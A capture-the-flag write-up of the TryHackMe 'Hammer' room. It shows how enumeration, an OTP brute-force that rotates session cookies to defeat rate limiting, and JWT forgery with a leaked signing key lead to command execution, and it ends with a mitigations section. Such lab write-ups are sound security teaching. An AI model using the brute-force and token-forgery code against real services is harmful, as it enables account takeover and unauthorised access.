# TryHackMe: Hammer

> **Difficulty:** Medium  
> **Category:** Web Application Security  
> **Topics:** Enumeration · OTP Brute-Force · Rate Limit Bypass · JWT Forgery · RCE  

---

## Overview

Hammer is a medium-difficulty web application room centred on broken authentication. The goal is to work through three distinct vulnerability classes in sequence: directory enumeration to find leaked credentials, OTP brute-force to bypass a password reset mechanism, and JWT token forgery to escalate privileges and achieve Remote Code Execution (RCE). No privilege escalation on the OS level is required; the entire attack surface is the web app itself.

---

## Enumeration

### Port Scan

I started with a standard Nmap service scan:

```bash
nmap -sV <TARGET_IP>
```

The initial scan only returned port **22 (SSH)**. Suspecting a non-standard HTTP port, I followed up with a full-range scan:

```bash
nmap -sV -p- <TARGET_IP>
```

This revealed a second open port: **1337**, running an HTTP service. Visiting `http://<TARGET_IP>:1337` in the browser dropped me straight onto a login page.

---

### Directory Fuzzing

Default credentials didn't work. Before touching the login form, I inspected the page source and noticed all static asset paths followed the prefix `hmr_`. That's a useful fuzzing clue. I ran:

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<TARGET_IP>:1337/hmr_FUZZ" -fc 404
```

One hit stood out immediately: `/hmr_logs`. Browsing to it revealed an `error.log` file containing a leaked email address:

```
tester@hammer.thm
```

That gave me a valid username for the application.

---

## Stage 1: OTP Brute-Force (Password Reset Bypass)

### Understanding the Reset Flow

I navigated to `/reset_password.php` and submitted `tester@hammer.thm`. The app redirected me to a recovery code prompt with a **180-second countdown timer**. Inspecting the POST request in Burp Suite showed:

- A `recovery_code` field (4-digit numeric)
- An `s` parameter (the countdown value, sourced from client-side JS: a red flag in itself)
- A `PHPSESSID` cookie binding the code to the session

The code space is only 10,000 possibilities (0000-9999), which is bruteforceable, but the app enforces **rate limiting**, locking attempts after roughly 6-8 wrong submissions per session.

### Bypassing Rate Limiting

The key insight: the rate limit is tied to the **session**, not the IP. By rotating `PHPSESSID`: getting a fresh cookie every 6 attempts: the counter resets. Each new session call re-submits the email to reinitialise the recovery state, giving a fresh code window.

I wrote `hammer_bypass.py` to automate this:

- Initialise a new session (GET the reset page → POST the email)
- Submit recovery codes 6 at a time
- Rotate the session, repeat
- Detect success by comparing response length (a successful code produces a noticeably different page)

```python
# Session rotation logic (core idea)
if i % 6 == 0:
    current_sid = get_new_session()

cookies = {"PHPSESSID": current_sid}
payload = {"recovery_code": f"{i:04d}", "s": "180"}
r = requests.post(URL, data=payload, headers=HEADERS, cookies=cookies)

# A word count differing from the baseline indicates success
if len(r.text.split()) != 148:
    print(f"[+] SUCCESS! Code: {i:04d}")
```

After a short run, the script returned a hit. I entered the discovered code into the browser, set a new password, and logged in.

**Flag 1** was visible on the dashboard after login.

---

## Stage 2: JWT Forgery (Privilege Escalation → RCE)

### Analysing the Dashboard

The dashboard exposed a command execution input, but it was heavily filtered. Certain commands like `cat` were blocked. Interestingly, `ls` worked and revealed a file in the web root:

```
188ade1.key
```

I couldn't read it through the command interface directly due to permission filtering, but the filename itself is significant: it looked like a JWT signing key.

### Extracting the JWT

Back in the page source, I found a JWT token embedded in the JavaScript. Decoding it at [jwt.io](https://jwt.io) showed:

```json
{
  "iss": "http://<TARGET_IP>:1337",
  "aud": "http://<TARGET_IP>:1337",
  "iat": <timestamp>,
  "exp": <timestamp>,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The `role` field is the target. To forge a token with `"role": "admin"`, I needed the signing key.

### Retrieving the Signing Key

Rather than trying to read the file via the filtered command interface, I fetched it directly over HTTP since it was in the web root:

```bash
curl http://<TARGET_IP>:1337/188ade1.key
```

That returned the secret key string used to sign JWTs.

### Forging the Token

With the key in hand, I crafted a new JWT: same structure, but with `"role": "admin"`, and signed it using the recovered secret:

```python
import jwt

secret = "<KEY_FROM_188ade1.key>"

payload = {
    "iss": "http://<TARGET_IP>:1337",
    "aud": "http://<TARGET_IP>:1337",
    "iat": <original_iat>,
    "exp": <original_exp + buffer>,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

I replaced the `Authorization` header in Burp Suite with the forged token and replayed the command execution request. The filter was gone: I had full command execution as an elevated role.

**Flag 2** was retrieved via the RCE interface.

---

## Vulnerability Summary

| # | Vulnerability | Impact |
|---|---|---|
| 1 | Sensitive data in log files (`tester@hammer.thm`) | Account enumeration |
| 2 | Client-side timer for OTP window (`s` parameter) | Attacker controls session timeout |
| 3 | Rate limiting tied to session, not IP | OTP brute-force viable via session rotation |
| 4 | JWT signing key exposed in web root | Token forgery / privilege escalation |
| 5 | Role-based access enforced only via JWT claim | Trivial privilege escalation once key is known |

---

## Lessons & Mitigations

**Rate limiting** should be enforced at the IP level (or via a combination of IP + session), and paired with exponential backoff or CAPTCHA after repeated failures: not just per-session request counts.

**OTP timers** must be tracked server-side. Sending the countdown value as a client-controlled POST parameter (`s=180`) is a logic flaw; a motivated attacker can simply extend it indefinitely.

**JWT signing keys** must never be placed in a web-accessible directory. They belong in environment variables or a secrets manager, with zero exposure via HTTP.

**Server-side command filtering** is not a substitute for proper authorisation. Blocking `cat` but allowing `ls` is security by obscurity: it slows an attacker down by seconds.

---

## Tools Used

- `nmap`: port scanning
- `ffuf`: directory fuzzing
- `Burp Suite`: request inspection and replay
- `Python` (`requests`, `PyJWT`): OTP brute-force and JWT forgery
- `curl`: key file retrieval
- `jwt.io`: token decoding

---

*Room: [TryHackMe: Hammer](https://tryhackme.com/room/hammer)*
